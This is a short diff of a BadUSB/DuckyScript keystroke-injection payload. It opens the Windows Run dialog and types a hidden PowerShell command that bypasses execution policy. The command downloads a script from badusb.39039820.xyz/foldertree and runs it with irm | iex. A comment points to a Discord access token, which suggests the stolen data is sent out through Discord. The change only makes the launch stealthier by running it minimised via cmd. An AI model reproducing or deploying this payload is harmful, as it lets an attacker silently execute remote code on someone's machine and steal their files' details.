@@ -10,5 +10,5 @@ REM	Update the $dc with the access token of Discord
 
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -Ep Bypass $dc='';$db='';irm badusb.39039820.xyz/foldertree | iex
+STRING cmd /c start /min "" powershell -w h -NoP -Ep Bypass -Command "$dc='';$db='';irm badusb.39039820.xyz/foldertree | iex"
 ENTER
